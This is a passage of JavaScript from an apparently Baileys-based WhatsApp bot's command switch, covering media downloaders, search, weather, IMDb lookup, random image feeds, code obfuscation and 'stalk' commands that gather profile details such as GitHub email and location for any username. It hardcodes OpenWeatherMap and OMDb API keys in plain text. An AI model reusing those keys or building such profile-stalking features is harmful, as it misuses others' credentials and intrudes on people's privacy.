await nyanBot2.sendMessage(m.chat, { audio: nyanBot2_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await StickWait()
let teman = pickRandom(verifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
reply('Managed to Get One Person')
}, 5000)
setTimeout(() => {
nyanBot2.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply the Message!!')
let xeonquotx= await nyanBot2.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return reply('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
reply(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return reply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                nyanBot2.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            case 'play':  case 'song': {
if (!text) return reply(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await nyanBot2.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp3': case 'ytaudio':
let xeonaudp3 = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return reply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
let audio = await xeonaudp3.mp3(text)
await nyanBot2.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await nyanBot2.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'git': case 'gitclone':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/Media`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    nyanBot2.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case 'tiktok':{
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
nyanBot2.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const xeontikmp3 = {url:data.audio}
nyanBot2.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case 'google': {
if (!q) return reply(`Example : ${prefix + command} ${botname}`)
await StickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'weather':{
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           nyanBot2.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'fb':
           case 'facebook': {
           if (!args[0]) {
    return reply(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return reply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    nyanBot2.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Maybe private video!')
  }
  }
  break
case 'tiktokstalk': {
	  if (!text) return reply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await nyanBot2.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_xeon13`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await nyanBot2.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return reply(`Example ${prefix+command} DGXeon`)
await StickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
nyanBot2.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`Github Stalker*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
await StickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
reply(`Npm Stalker*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return reply(`Example ${prefix+command} 946716486`)
await StickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return reply(`Example ${prefix+command} 530793138|8129`)
await StickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return reply(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return reply('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return reply('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return reply( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "dgxeon",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await nyanBot2.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return reply(`_Name a Series or movie`)
await StickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           nyanBot2.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
reply(db)
}
break
case 'happymod':{
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
await StickWait()
let kat = await scp2.happymod(q)
reply(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	await StickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	nyanBot2.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
if (!text) return reply(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
nyanBot2.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return reply(`Example : ${prefix + command} black rover`)
        let ringtone = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		nyanBot2.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':
await StickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await StickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await StickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await StickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await StickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await StickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await StickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
nyanBot2.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
nyanBot2.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			await StickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			nyanBot2.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'define': 
if (!q) return reply(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return reply(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   nyanBot2.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return reply(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await reply(jawab)
            }
            break
            case 'is': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
            case 'when': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await reply(jawab)
            }
            break
case 'what': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'where': {
if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await reply(jawab)
            }
            break
case 'how': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'rate': {
            	if (!text) return reply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await reply(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                reply(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
